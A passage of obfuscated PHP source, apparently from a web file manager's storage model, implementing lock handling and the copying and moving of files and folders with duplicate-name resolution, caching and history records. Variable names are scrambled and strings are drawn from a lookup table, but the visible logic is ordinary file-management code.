$•Ó•ÆªŒ; $this->_lockTimeStart[$òˆàÖôî] = timeFloat(); if (!is_array($¿ÑŒÎá§)) { return; } $³”Õ€òô = LNG($ÚËŸå[633]); CacheLock::setErrorMsg($ÚËŸå[176] . htmlspecialchars($¿ÑŒÎá§[$ÚËŸå[32]]) . $ÚËŸå[178] . $³”Õ€òô); $this->_lockKey($òˆàÖôî, 1); $this->_lockKey($òˆàÖôî, 0); $Ã†ÏÃñ™ = array_reverse($this->parentLevelArray($¿ÑŒÎá§[$ÚËŸå[588]])); foreach ($Ã†ÏÃñ™ as $ı¦Ò©™ı) { $òˆàÖôî = $¢¶ê‡šú . $ÚËŸå[634] . $ı¦Ò©™ı; if (CacheLock::lockGet($ÚËŸå[635] . $òˆàÖôî)) { $¿ÑŒÎá§ = $this->sourceInfo($ı¦Ò©™ı); CacheLock::setErrorMsg($ÚËŸå[176] . htmlspecialchars($¿ÑŒÎá§[$ÚËŸå[32]]) . $ÚËŸå[178] . $³”Õ€òô); $this->_lockKey($òˆàÖôî, 1); $this->_lockKey($òˆàÖôî, 0); } } } private function _lockCheckEnd($©«ó¬¦, $Ò¯Æ«—ƒ) { $ùËÁôÒ =& $_SERVER[†ûãı«°]; $¶˜ö­ş = $©«ó¬¦ . $ùËÁôÒ[10] . $Ò¯Æ«—ƒ; CacheLock::setErrorMsg($ùËÁôÒ[456]); if (!isset($this->_lockTimeStart[$¶˜ö­ş])) { return; } $æåí¾Äå = timeFloat() - $this->_lockTimeStart[$¶˜ö­ş]; unset($this->_lockTimeStart[$¶˜ö­ş]); if ($æåí¾Äå > 0.5) { unset(self::$cacheSourceInfo[$ùËÁôÒ[535] . $Ò¯Æ«—ƒ]); } $êöµ°ˆõ = $this->sourceInfo($Ò¯Æ«—ƒ); if (!$êöµ°ˆõ) { show_json(LNG($ùËÁôÒ[108]), !1); } } private function _lockParent($«”óÉ’µ, $‡ŒÎáÓÃ, $à•¦±¨) { if (!$this->autoLockSet) { return; } $éÔñœÓ“ = $this->sourceInfo($«”óÉ’µ); if (!is_array($éÔñœÓ“)) { return; } $“˜…Ñ£ = array_reverse($this->parentLevelArray($éÔñœÓ“[$_SERVER[†ûãı«°][588]])); foreach ($“˜…Ñ£ as $èˆâ°ñÈ) { $this->_lockEvent($èˆâ°ñÈ, $‡ŒÎáÓÃ, $à•¦±¨); } } private function _lockEvent($§áòÎùí, $¼›× ÃÃ, $³ç¬·•µ) { $®àöøé€ =& $_SERVER[†ûãı«°]; if (!$this->autoLockSet) { return; } foreach ($¼›× ÃÃ as $×ìÅÈ™Ø) { $ÚÊ‹°Íé = $×ìÅÈ™Ø . $®àöøé€[10] . $§áòÎùí; if ($³ç¬·•µ && CacheLock::lockGet($®àöøé€[635] . $ÚÊ‹°Íé)) { continue; } $this->_lockKey($ÚÊ‹°Íé, $³ç¬·•µ); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($ºş÷åüÀ, $¨ñÇå«¯ = 1) { $ÃñÎ×ƒ» = $_SERVER[†ûãı«°][635] . md5($ºş÷åüÀ); if ($¨ñÇå«¯) { if (isset(self::$_lockItemArr[$ÃñÎ×ƒ»])) { return; } self::$_lockItemArr[$ÃñÎ×ƒ»] = 1; CacheLock::lock($ÃñÎ×ƒ», $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$ÃñÎ×ƒ»])) { return; } unset(self::$_lockItemArr[$ÃñÎ×ƒ»]); CacheLock::unlock($ÃñÎ×ƒ»); } } public function isParentOf($¦ï¹¡“•, $±á°à™) { $ˆ›£Şëğ =& $_SERVER[†ûãı«°]; $“Ø¬„ûş = $this->sourceInfo($¦ï¹¡“•); $ø¼§ØÁ¥ = $this->sourceInfo($±á°à™); $àªâãÓ© = $“Ø¬„ûş[$ˆ›£Şëğ[588]] . $“Ø¬„ûş[$ˆ›£Şëğ[193]] . $ˆ›£Şëğ[50]; $­†çÌƒ’ = $ø¼§ØÁ¥[$ˆ›£Şëğ[588]] . $ø¼§ØÁ¥[$ˆ›£Şëğ[193]] . $ˆ›£Şëğ[50]; $Û€Ã“© = strpos($­†çÌƒ’, $àªâãÓ©) === 0; return $Û€Ã“©; } private $targetIsDelete = 0; public function copy($¤´¥Á¯, $—ÉèÄ, $×À”Ô‹ = REPEAT_REPLACE, $Ûª—Ù¦ = '') { $é¸Ìøâï =& $_SERVER[†ûãı«°]; $ÀŠñùñ£ = $this->sourceInfo($¤´¥Á¯); $µ«¦èßˆ = $this->sourceInfo($—ÉèÄ); if (!$ÀŠñùñ£ || !$µ«¦èßˆ || $µ«¦èßˆ[$é¸Ìøâï[487]] != $é¸Ìøâï[91]) { return !1; } if ($this->isParentOf($¤´¥Á¯, $—ÉèÄ)) { return !1; } $ÑÈ»ÇáÌ = $Ûª—Ù¦ ? $Ûª—Ù¦ : $ÀŠñùñ£[$é¸Ìøâï[32]]; $this->lockCopyStart($¤´¥Á¯); $this->lockWriteStart($—ÉèÄ, $ÑÈ»ÇáÌ); $ØŞì¿ô‰ = array($é¸Ìøâï[636] => array(), $é¸Ìøâï[637] => array(), $é¸Ìøâï[638] => array()); $this->targetIsDelete = intval($ÀŠñùñ£[$é¸Ìøâï[507]]); $¶…ÔÏ”Ğ = $this->fileNameExistAuto($—ÉèÄ, $ÀŠñùñ£); $Ó½ Æ¾Û = $this->_copy($¤´¥Á¯, $—ÉèÄ, $×À”Ô‹, $ØŞì¿ô‰, !0, $Ûª—Ù¦); $this->_childrenListClear(); $this->lockCopyEnd($¤´¥Á¯); $this->lockWriteEnd($—ÉèÄ, $ÑÈ»ÇáÌ); if ($ÀŠñùñ£[$é¸Ìøâï[487]] == $é¸Ìøâï[91] && $¶…ÔÏ”Ğ == $Ó½ Æ¾Û) { $this->folderSizeResetChildren($¶…ÔÏ”Ğ); } Model($é¸Ìøâï[639])->addAll($ØŞì¿ô‰[$é¸Ìøâï[637]], array(), !0); if ($¶…ÔÏ”Ğ != $Ó½ Æ¾Û || $ÀŠñùñ£[$é¸Ìøâï[487]] == $é¸Ìøâï[91]) { Model($é¸Ìøâï[640])->eventCopy($Ó½ Æ¾Û); } $this->saveAll($ØŞì¿ô‰[$é¸Ìøâï[638]]); Model($é¸Ìøâï[232])->linkAdd($ØŞì¿ô‰[$é¸Ìøâï[636]]); $this->folderSizeReset($—ÉèÄ); $this->updateModifyTime($—ÉèÄ); return $Ó½ Æ¾Û; } private function _copy($ë²¢Â¿¸, $ı¸˜ûª©, $š”íØ«è, &$‡ÛÖÉê , $¡æ·ÍÊŞ, $êŠ¦Œº = '') { $Ö­Çô© =& $_SERVER[†ûãı«°]; $Ù‡Í‘ª = $this->sourceInfoCache($ë²¢Â¿¸); $£®åİğ¥ = $Ù‡Í‘ª[$Ö­Çô©[487]] == $Ö­Çô©[91]; $²’Ü˜‰Ö = $êŠ¦Œº ? $êŠ¦Œº : $Ù‡Í‘ª[$Ö­Çô©[32]]; $ñ¬ß±“ú = $this->fileNameExistAuto($ı¸˜ûª©, $Ù‡Í‘ª); if ($¡æ·ÍÊŞ) { $this->_childrenAllMake($ë²¢Â¿¸); if ($£®åİğ¥ && $ñ¬ß±“ú) { $this->_childrenAllMake($ñ¬ß±“ú); } } if (!$ñ¬ß±“ú) { return $this->_copyCreate($ë²¢Â¿¸, $ı¸˜ûª©, $²’Ü˜‰Ö, $‡ÛÖÉê ); } $ÅµÚø¯İ = $ñ¬ß±“ú; if ($£®åİğ¥) { if ($š”íØ«è == REPEAT_RENAME_FOLDER) { $²’Ü˜‰Ö = $this->fileNameAutoCache($ı¸˜ûª©, $²’Ü˜‰Ö, $š”íØ«è, $£®åİğ¥); $ÅµÚø¯İ = $this->_copyCreate($ë²¢Â¿¸, $ı¸˜ûª©, $²’Ü˜‰Ö, $‡ÛÖÉê ); } else { $ŠÊù¹Ö = $this->_childrenList($ë²¢Â¿¸); foreach ($ŠÊù¹Ö as $ƒ²¬Ò´­) { $this->_copy($ƒ²¬Ò´­[$Ö­Çô©[193]], $ñ¬ß±“ú, $š”íØ«è, $‡ÛÖÉê , !1); } } } else { if ($š”íØ«è == REPEAT_RENAME || $š”íØ«è == REPEAT_RENAME_FOLDER) { $²’Ü˜‰Ö = $this->fileNameAutoCache($ı¸˜ûª©, $²’Ü˜‰Ö, $š”íØ«è, $£®åİğ¥); $ÅµÚø¯İ = $this->_copyCreate($ë²¢Â¿¸, $ı¸˜ûª©, $²’Ü˜‰Ö, $‡ÛÖÉê ); } else { if ($š”íØ«è == REPEAT_REPLACE) { $¿úÛ“‰é = $this->sourceInfoCache($ñ¬ß±“ú); $¾•æñ¦İ = $this->fileHistory($¿úÛ“‰é, $Ù‡Í‘ª[$Ö­Çô©[545]], $Ù‡Í‘ª[$Ö­Çô©[79]]); if ($¾•æñ¦İ) { $‡ÛÖÉê [$Ö­Çô©[636]][] = $Ù‡Í‘ª[$Ö­Çô©[545]]; } } else { if ($š”íØ«è == REPEAT_SKIP) { } } } Hook::trigger($Ö­Çô©[641], array($Ö­Çô©[642], $Ù‡Í‘ª, 0)); } return $ÅµÚø¯İ; } private function _copyCreate($Á‚ìÉ€û, $ĞˆÇõúÀ, $ßÂÒ¡õÅ, &$“¬ŠÊé½) { $†ÊÇÁµ— =& $_SERVER[†ûãı«°]; $¢¬¾—éø = $this->sourceInfoCache($Á‚ìÉ€û); $’¢ÁÁŸü = $this->sourceInfoCache($ĞˆÇõúÀ); $Ö±ÃĞ‘ = $this->_makeItemData($¢¬¾—éø, $’¢ÁÁŸü, $ßÂÒ¡õÅ); Hook::trigger($†ÊÇÁµ—[643], $Ö±ÃĞ‘); Hook::trigger($†ÊÇÁµ—[644], array($†ÊÇÁµ—[645], $Ö±ÃĞ‘, 0)); $½‚’§å† = $this->add($Ö±ÃĞ‘); $â¾‹›·î = array($†ÊÇÁµ—[193] => $½‚’§å†, $†ÊÇÁµ—[32] => $ßÂÒ¡õÅ); $this->_copyApplyMeta($â¾‹›·î, $“¬ŠÊé½); if ($¢¬¾—éø[$†ÊÇÁµ—[487]] != $†ÊÇÁµ—[91]) { $“¬ŠÊé½[$†ÊÇÁµ—[636]][] = $¢¬¾—éø[$†ÊÇÁµ—[545]]; return $½‚’§å†; } $›“ƒÙàª = array(); $½à÷‰ö¹ = array(); $this->_childrenListAll($Á‚ìÉ€û, $›“ƒÙàª); $Ó‚¾¯¹ = count($›“ƒÙàª); if ($Ó‚¾¯¹ == 0) { return $½‚’§å†; } $ƒı¬œ = $this->sourceInfo($½‚’§å†); foreach ($›“ƒÙàª as $±ğØàİê) { $ú¤ÖÚº = $this->_makeItemData($±ğØàİê, $ƒı¬œ, $±ğØàİê[$†ÊÇÁµ—[32]]); $ú¤ÖÚº[$†ÊÇÁµ—[588]] = $±ğØàİê[$†ÊÇÁµ—[588]]; $½à÷‰ö¹[] = $ú¤ÖÚº; } $this->chunkEventSet($†ÊÇÁµ—[646], array($†ÊÇÁµ—[647], $Ö±ÃĞ‘, $Ó‚¾¯¹)); $this->addAll($½à÷‰ö¹, array(), !1); $Çü­ë¥ = $this->where(array($†ÊÇÁµ—[192] => $½‚’§å†))->select(); $Ÿ’£Õ­² = $this->_childrenMakeRelation($›“ƒÙàª, $Çü­ë¥); $Ÿ’£Õ­²[$Á‚ìÉ€û] = $½‚’§å†; $º„ìè¬ = array(); $€›†à£Š = array(); foreach ($Çü­ë¥ as $±ğØàİê) { $›°äÈ¨» = $±ğØàİê[$†ÊÇÁµ—[193]]; $êı‡ÛÔì = $this->_childrenMatch($Ÿ’£Õ­², $±ğØàİê, $ƒı¬œ); $º„ìè¬[] = array($†ÊÇÁµ—[193], $›°äÈ¨», $†ÊÇÁµ—[192], $êı‡ÛÔì[$†ÊÇÁµ—[192]]); $€›†à£Š[] = array($†ÊÇÁµ—[193], $›°äÈ¨», $†ÊÇÁµ—[588], $êı‡ÛÔì[$†ÊÇÁµ—[588]]); $this->_copyApplyMeta($±ğØàİê, $“¬ŠÊé½); if ($±ğØàİê[$†ÊÇÁµ—[487]] != $†ÊÇÁµ—[91]) { $“¬ŠÊé½[$†ÊÇÁµ—[636]][] = $±ğØàİê[$†ÊÇÁµ—[545]]; } } $this->chunkEventSet($†ÊÇÁµ—[648], array($†ÊÇÁµ—[649], $Ö±ÃĞ‘, $Ó‚¾¯¹)); $this->saveAll($º„ìè¬); $this->chunkEventSet($†ÊÇÁµ—[650], array($†ÊÇÁµ—[651], $Ö±ÃĞ‘, $Ó‚¾¯¹)); $this->saveAll($€›†à£Š); return $½‚’§å†; } private function _childrenMakeRelation($€›éÁ¹Ç, $É¬ïøíŞ) { $™ûäæÄŞ =& $_SERVER[†ûãı«°]; $à»Øœ¸ö = array(); $«¼æ°à” = array(); foreach ($€›éÁ¹Ç as $†©Ğ„ ) { $»øÀ£âå = $†©Ğ„ [$™ûäæÄŞ[32]] . $™ûäæÄŞ[8] . $†©Ğ„ [$™ûäæÄŞ[588]]; $à»Øœ¸ö[$»øÀ£âå] = $†©Ğ„ [$™ûäæÄŞ[193]]; } foreach ($É¬ïøíŞ as $†©Ğ„ ) { $»øÀ£âå = $†©Ğ„ [$™ûäæÄŞ[32]] . $™ûäæÄŞ[8] . $†©Ğ„ [$™ûäæÄŞ[588]]; $—º¦¶Ğê = $à»Øœ¸ö[$»øÀ£âå]; $«¼æ°à”[$—º¦¶Ğê] = $†©Ğ„ [$™ûäæÄŞ[193]]; } return $«¼æ°à”; } private function _childrenMatch($ÏĞ¶ôÃÕ, $ğš˜ê€Ş, $ÍŒ×Îå“) { $ÇëÛ°÷Ñ =& $_SERVER[†ûãı«°]; $…ë•åØ = $ÍŒ×Îå“[$ÇëÛ°÷Ñ[588]]; $ûÆŒ¬¤ = $this->parentLevelArray($ğš˜ê€Ş[$ÇëÛ°÷Ñ[588]]); foreach ($ûÆŒ¬¤ as $á‘µ‰™Ğ) { if (isset($ÏĞ¶ôÃÕ[$á‘µ‰™Ğ])) { $…ë•åØ .= $ÏĞ¶ôÃÕ[$á‘µ‰™Ğ] . $ÇëÛ°÷Ñ[652]; } } $…ë•åØ = rtrim($…ë•åØ, $ÇëÛ°÷Ñ[50]) . $ÇëÛ°÷Ñ[50]; $ŞÍ…÷àÊ = $this->parentLevelArray($…ë•åØ); $É÷€“ = $ŞÍ…÷àÊ[count($ŞÍ…÷àÊ) - 1]; return array($ÇëÛ°÷Ñ[192] => $É÷€“, $ÇëÛ°÷Ñ[588] => $…ë•åØ); } private function _makeItemData($ÑÃ¤Ó‹É, $¤”ÕÚ³ò, $Òæµ½Ş¿) { $Ê¤’®Æ =& $_SERVER[†ûãı«°]; $´åêĞ§« = array($Ê¤’®Æ[653] => $ÑÃ¤Ó‹É[$Ê¤’®Æ[487]], $Ê¤’®Æ[496] => $Òæµ½Ş¿, $Ê¤’®Æ[654] => $ÑÃ¤Ó‹É[$Ê¤’®Æ[488]] ? $ÑÃ¤Ó‹É[$Ê¤’®Æ[488]] : $Ê¤’®Æ[12], $Ê¤’®Æ[546] => $ÑÃ¤Ó‹É[$Ê¤’®Æ[545]] ? $ÑÃ¤Ó‹É[$Ê¤’®Æ[545]] : 0, $Ê¤’®Æ[624] => $ÑÃ¤Ó‹É[$Ê¤’®Æ[79]] ? $ÑÃ¤Ó‹É[$Ê¤’®Æ[79]] : 0, $Ê¤’®Æ[655] => intval($¤”ÕÚ³ò[$Ê¤’®Æ[190]]), $Ê¤’®Æ[656] => intval($¤”ÕÚ³ò[$Ê¤’®Æ[573]]), $Ê¤’®Æ[657] => intval(USER_ID), $Ê¤’®Æ[658] => intval(USER_ID), $Ê¤’®Æ[479] => intval($¤”ÕÚ³ò[$Ê¤’®Æ[193]]), $Ê¤’®Æ[659] => $¤”ÕÚ³ò[$Ê¤’®Æ[588]] . $¤”ÕÚ³ò[$Ê¤’®Æ[193]] . $Ê¤’®Æ[50], $Ê¤’®Æ[500] => $ÑÃ¤Ó‹É[$Ê¤’®Æ[88]] ? $ÑÃ¤Ó‹É[$Ê¤’®Æ[88]] : time(), $Ê¤’®Æ[506] => 0, $Ê¤’®Æ[660] => $Ê¤’®Æ[12]); return $´åêĞ§«; } private function _copyApplyMeta($¹Àáö®ñ, &$²·õÆ¡) { $ç×Å¡´ï =& $_SERVER[†ûãı«°]; $ıºèíôï = $¹Àáö®ñ[$ç×Å¡´ï[193]]; $››ˆÛº¥ = $¹Àáö®ñ[$ç×Å¡´ï[32]]; if (!isset($¹Àáö®ñ[$ç×Å¡´ï[661]]) || !$¹Àáö®ñ[$ç×Å¡´ï[661]] || $¹Àáö®ñ[$ç×Å¡´ï[661]] == $ç×Å¡´ï[230]) { $²·õÆ¡[$ç×Å¡´ï[638]][] = array($ç×Å¡´ï[193], $ıºèíôï, $ç×Å¡´ï[661], short_id($ıºèíôï)); } if (Input::check($››ˆÛº¥, $ç×Å¡´ï[662])) { $²·õÆ¡[$ç×Å¡´ï[637]][] = array($ç×Å¡´ï[193] => $ıºèíôï, $ç×Å¡´ï[97] => $ç×Å¡´ï[540], $ç×Å¡´ï[452] => str_replace($ç×Å¡´ï[53], $ç×Å¡´ï[12], Pinyin::get($››ˆÛº¥))); $²·õÆ¡[$ç×Å¡´ï[637]][] = array($ç×Å¡´ï[193] => $ıºèíôï, $ç×Å¡´ï[97] => $ç×Å¡´ï[539], $ç×Å¡´ï[452] => Pinyin::get($››ˆÛº¥, $ç×Å¡´ï[663])); } $²·õÆ¡[$ç×Å¡´ï[637]][] = array($ç×Å¡´ï[193] => $ıºèíôï, $ç×Å¡´ï[97] => $ç×Å¡´ï[519], $ç×Å¡´ï[452] => KodSort::makeStr($››ˆÛº¥)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($´ƒ«Ğ«) { $šÓ½â€œ =& $_SERVER[†ûãı«°]; $®ÓùıÖÔ = $this->sourceInfo($´ƒ«Ğ«); $´á±¤… = $šÓ½â€œ[664]; $×ÆŸÃ×Â = array($šÓ½â€œ[588] => array($šÓ½â€œ[619], $®ÓùıÖÔ[$šÓ½â€œ[588]] . $´ƒ«Ğ« . $šÓ½â€œ[620]), $šÓ½â€œ[507] => $this->targetIsDelete); $•›éìíÌ = $this->field($´á±¤…)->where($×ÆŸÃ×Â)->select(); if (!$•›éìíÌ) { return; } $•›éìíÌ = array_to_keyvalue($•›éìíÌ, $šÓ½â€œ[193]); foreach ($•›éìíÌ as $ù­Ñ¶) { $œ€Ñßò = $ù­Ñ¶[$šÓ½â€œ[192]]; $´ƒ«Ğ« = $ù­Ñ¶[$šÓ½â€œ[193]]; if (!isset($this->_childrenListCache[$´ƒ«Ğ«]) && $ù­Ñ¶[$šÓ½â€œ[487]] == $šÓ½â€œ[91]) { $this->_childrenListCache[$´ƒ«Ğ«] = array(); } if (!isset($this->_childrenListCache[$œ€Ñßò])) { $this->_childrenListCache[$œ€Ñßò] = array(); } $this->_childrenListCache[$œ€Ñßò][$´ƒ«Ğ«] = $ù­Ñ¶; $this->_childrenItemCache[$´ƒ«Ğ«] = $ù­Ñ¶; } } private function _childrenListAll($ğÄ–Íö­, &$ŠŸóü©•) { $£³…Úµ =& $_SERVER[†ûãı«°]; if (!isset($this->_childrenListCache[$ğÄ–Íö­])) { return; } $õÀä¶ü× = $this->_childrenListCache[$ğÄ–Íö­]; foreach ($õÀä¶ü× as $¼´˜›¯ş => $ì«ı¯İ¿) { $ŠŸóü©•[$¼´˜›¯ş] = $ì«ı¯İ¿; if ($ì«ı¯İ¿[$£³…Úµ[487]] == $£³…Úµ[91]) { $this->_childrenListAll($¼´˜›¯ş, $ŠŸóü©•); } } } private function sourceInfoCache($ÙÙî•£ä) { if (isset($this->_childrenItemCache[$ÙÙî•£ä])) { return $this->_childrenItemCache[$ÙÙî•£ä]; } return $this->sourceInfo($ÙÙî•£ä); } private function _childrenList($ì¤é¯¯¦) { if (isset($this->_childrenListCache[$ì¤é¯¯¦])) { return $this->_childrenListCache[$ì¤é¯¯¦]; } return $this->_childrenListSelect($ì¤é¯¯¦); } private function _childrenListSelect($Õ¬Î§Ì) { $­ìÛŒÉ‡ =& $_SERVER[†ûãı«°]; $Ó°²ëÕª = array($­ìÛŒÉ‡[192] => $Õ¬Î§Ì, $­ìÛŒÉ‡[507] => $this->targetIsDelete); $«ĞÜÖ¨µ = $this->where($Ó°²ëÕª)->select(); $«ĞÜÖ¨µ = $«ĞÜÖ¨µ ? $«ĞÜÖ¨µ : array(); $şÅæ¼Æ˜ = array_to_keyvalue($«ĞÜÖ¨µ, $­ìÛŒÉ‡[193]); $this->_childrenListCache[$Õ¬Î§Ì] = $şÅæ¼Æ˜; foreach ($şÅæ¼Æ˜ as $Õ¬Î§Ì => $„ÊŸòÖÊ) { $this->_childrenItemCache[$Õ¬Î§Ì] = $„ÊŸòÖÊ; } return $şÅæ¼Æ˜; } private function fileNameExistAuto($©¤”©‡á, $ËÔ“¯õÛ) { $­šÂ»šñ =& $_SERVER[†ûãı«°]; if ($ËÔ“¯õÛ[$­šÂ»šñ[507]] == $­šÂ»šñ[91]) { return $this->fileNameExist($©¤”©‡á, $ËÔ“¯õÛ[$­šÂ»šñ[32]]); } return $this->fileNameExistCache($©¤”©‡á, $ËÔ“¯õÛ[$­šÂ»šñ[32]]); } private function fileNameExistCache($ƒÈü—©, $¶»ªÜ‡) { $»ÇÊ›» =& $_SERVER[†ûãı«°]; $¶»ªÜ‡ = strtolower($¶»ªÜ‡); $É¨œÀ† = $this->_childrenList($ƒÈü—©); foreach ($É¨œÀ† as $éôÄ¸òÚ) { if ($¶»ªÜ‡ == strtolower($éôÄ¸òÚ[$»ÇÊ›»[32]])) { return $éôÄ¸òÚ[$»ÇÊ›»[193]]; } } return !1; } private function fileNameAutoCache($‰¼®Äâî, $÷’ËİÚ, $’È–“‹‚, $õ‹à¶µ±) { $É°”‰ùà =& $_SERVER[†ûãı«°]; $Ö©âØ²½ = $this->_childrenList($‰¼®Äâî); $Ğ©¸Ê±‹ = array_to_keyvalue($Ö©âØ²½, $É°”‰ùà[12], $É°”‰ùà[32]); return $this->fileNameAutoGet($Ğ©¸Ê±‹, $÷’ËİÚ, $’È–“‹‚, $õ‹à¶µ±); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($’…ß‚²‰, $œ”¾ğÏ, $åõ¹Ç¯ = REPEAT_REPLACE, $ÓœàÌÑ = '') { $µÄã»éˆ =& $_SERVER[†ûãı«°]; $×ÑµÂş§ = $this->sourceInfo($’…ß‚²‰); $™ˆõ¦÷ê = $this->sourceInfo($œ”¾ğÏ); if ($×ÑµÂş§[$µÄã»éˆ[192]] == $™ˆõ¦÷ê[$µÄã»éˆ[193]]) { if ($×ÑµÂş§[$µÄã»éˆ[507]] == $µÄã»éˆ[91]) { Model($µÄã»éˆ[505])->restore(array($’…ß‚²‰)); } if (!$ÓœàÌÑ || $ÓœàÌÑ == $×ÑµÂş§[$µÄã»éˆ[32]]) { return $’…ß‚²‰; } } $õ³ÆüÇ’ = $this->pathInfoMore($’…ß‚²‰); if ($this->isParentOf($’…ß‚²‰, $œ”¾ğÏ)) { return !1; } if (!$×ÑµÂş§ || !$™ˆõ¦÷ê || $™ˆõ¦÷ê[$µÄã»éˆ[487]] != $µÄã»éˆ[91]) { return !1; } Hook::trigger($µÄã»éˆ[665], $õ³ÆüÇ’); $this->targetIsDelete = intval($×ÑµÂş§[$µÄã»éˆ[507]]); if ($×ÑµÂş§[$µÄã»éˆ[192]] == $œ”¾ğÏ && $ÓœàÌÑ != $×ÑµÂş§[$µÄã»éˆ[32]]) { $Ï‹Û°Ì = $this->fileNameExist($œ”¾ğÏ, $ÓœàÌÑ); if ($Ï‹Û°Ì && $×ÑµÂş§[$µÄã»éˆ[487]] == $µÄã»éˆ[230]) { $ù•ñ‹†ø = $this->sourceInfo($Ï‹Û°Ì); $éø¸¨ğ» = $this->fileHistory($ù•ñ‹†ø, $×ÑµÂş§[$µÄã»éˆ[545]], $×ÑµÂş§[$µÄã»éˆ[79]]); if (!$éø¸¨ğ») { Model($µÄã»éˆ[548])->remove($×ÑµÂş§[$µÄã»éˆ[545]]); } $this->removeNow($’…ß‚²‰, !1); $this->folderSizeReset($œ”¾ğÏ); Hook::trigger($µÄã»éˆ[666], $õ³ÆüÇ’); return $Ï‹Û°Ì; } } $¶µ–‰ğÇ = $ÓœàÌÑ ? $ÓœàÌÑ : $×ÑµÂş§[$µÄã»éˆ[32]]; $this->lockMoveStart($’…ß‚²‰); $this->lockWriteStart($œ”¾ğÏ, $¶µ–‰ğÇ); $”¾éíÕ€ = array($µÄã»éˆ[636] => array(), $µÄã»éˆ[667] => !1); $this->clearShare($’…ß‚²‰, $œ”¾ğÏ); $ôóÇ—èÜ = $this->fileNameExistAuto($œ”¾ğÏ, $×ÑµÂş§); $Œº±„Æ— = $this->_move($’…ß‚²‰, $œ”¾ğÏ, $åõ¹Ç¯, $”¾éíÕ€, $ÓœàÌÑ); $this->sourceCacheClear(); if ($×ÑµÂş§[$µÄã»éˆ[487]] == $µÄã»éˆ[91] && $ôóÇ—èÜ) { $this->folderSizeResetChildren($Œº±„Æ—); } Model($µÄã»éˆ[232])->linkAdd($”¾éíÕ€[$µÄã»éˆ[636]]); if ($Œº±„Æ— && $ôóÇ—èÜ && $”¾éíÕ€[$µÄã»éˆ[667]]) { $´Àä²´ = $×ÑµÂş§[$µÄã»éˆ[487]] == $µÄã»éˆ[91] ? $this->_childrenListSelect($’…ß‚²‰) : !1; $ß–ôÛÜŸ = $´Àä²´ && count($´Àä²´) > 0 ? !0 : !1; $this->removeNow($’…ß‚²‰, $ß–ôÛÜŸ); } $this->lockMoveEnd($’…ß‚²‰); $this->lockWriteEnd($œ”¾ğÏ, $¶µ–‰ğÇ); $this->folderSizeReset($×ÑµÂş§[$µÄã»éˆ[192]]); $this->folderSizeReset($œ”¾ğÏ); $û¦§æ‚ß = array($×ÑµÂş§[$µÄã»éˆ[192]], $œ”¾ğÏ); if ($×ÑµÂş§[$µÄã»éˆ[487]] == $µÄã»éˆ[91]) { $û¦§æ‚ß[] = $’…ß‚²‰; } $this->updateModifyTime($û¦§æ‚ß); Model($µÄã»éˆ[640])->eventMove($’…ß‚²‰, $×ÑµÂş§[$µÄã»éˆ[192]], $œ”¾ğÏ); Hook::trigger($µÄã»éˆ[666], $õ³ÆüÇ’); return $Œº±„Æ—; } private function _move($ºÄ·ÀË, $¨ñ¸‘Í³, $¦¶›Ë‰, &$¸ú‘üÎÈ, $çğ¯Œˆ = '') { $Í‰òÎÒ =& $_SERVER[†ûãı«°]; $ùñˆ¦¥ = $this->sourceInfo($ºÄ·ÀË); $Á¡ŞØë = $ùñˆ¦¥[$Í‰òÎÒ[487]] == $Í‰òÎÒ[91]; $Üò÷µ® = $çğ¯Œˆ ? $çğ¯Œˆ : $ùñˆ¦¥[$Í‰òÎÒ[32]]; $ÛÔîÂ«É = $this->fileNameExistAuto($¨ñ¸‘Í³, $ùñˆ¦¥); $this->lockMoveStart($ºÄ·ÀË); $this->lockWriteStart($¨ñ¸‘Í³, $Üò÷µ®); if (!$ÛÔîÂ«É) { return $this->_moveForce($ºÄ·ÀË, $¨ñ¸‘Í³, $Üò÷µ®); } $ÖÀ²°¨È = $ÛÔîÂ«É; $ñÕØŒ‚ğ = !1; if ($Á¡ŞØë) { if ($¦¶›Ë‰ == REPEAT_RENAME_FOLDER) { $Üò÷µ® = $this->fileNameAuto($¨ñ¸‘Í³, $Üò÷µ®, $¦¶›Ë‰, $Á¡ŞØë); $ÖÀ²°¨È = $this->_moveForce($ºÄ·ÀË, $¨ñ¸‘Í³, $Üò÷µ®); } else { $á“‘õ§ = $this->_childrenListSelect($ºÄ·ÀË); foreach ($á“‘õ§ as $˜«Ú¼¡Ó) { $µÜº ÖÕ = REPEAT_REPLACE; $this->_move($˜«Ú¼¡Ó[$Í‰òÎÒ[193]], $ÛÔîÂ«É, $µÜº ÖÕ, $¸ú‘üÎÈ); } $ñÕØŒ‚ğ = !0; } } else { if ($¦¶›Ë‰ == REPEAT_RENAME || $¦¶›Ë‰ == REPEAT_RENAME_FOLDER) { $Üò÷µ® = $this->fileNameAuto($¨ñ¸‘Í³, $Üò÷µ®, $¦¶›Ë‰, $Á¡ŞØë); $ÖÀ²°¨È = $this->_moveForce($ºÄ·ÀË, $¨ñ¸‘Í³, $Üò÷µ®); } else { $ŸÆî¹ˆç = $this->sourceInfoCache($ÛÔîÂ«É); $™úÂıÙ = $this->fileHistory($ŸÆî¹ˆç, $ùñˆ¦¥[$Í‰òÎÒ[545]], $ùñˆ¦¥[$Í‰òÎÒ[79]]); if ($™úÂıÙ) { $¸ú‘üÎÈ[$Í‰òÎÒ[636]][] = $ùñˆ¦¥[$Í‰òÎÒ[545]]; } $ñÕØŒ‚ğ = !0; } } if ($ñÕØŒ‚ğ) { $¸ú‘üÎÈ[$Í‰òÎÒ[667]] = !0; } return $ÖÀ²°¨È; } private function _moveForce($Øş¨ô£, $°™íŒ¾, $‡ËÂœÍ‘) { $Ÿµ¦ÏÖ¬ =& $_SERVER[†ûãı«°]; $¢‡°·©í = $this->sourceInfo($Øş¨ô£); $ÙîŠÈİ = $this->sourceInfo($°™íŒ¾); $®¥ôõ£’ = $¢‡°·©í[$Ÿµ¦ÏÖ¬[487]] == $Ÿµ¦ÏÖ¬[91]; $ÊÚ±ÙÛ® = array($Ÿµ¦ÏÖ¬[479] => $ÙîŠÈİ[$Ÿµ¦ÏÖ¬[193]], $Ÿµ¦ÏÖ¬[659] => $ÙîŠÈİ[$Ÿµ¦ÏÖ¬[588]] . $ÙîŠÈİ[$Ÿµ¦ÏÖ¬[193]] . $Ÿµ¦ÏÖ¬[50], 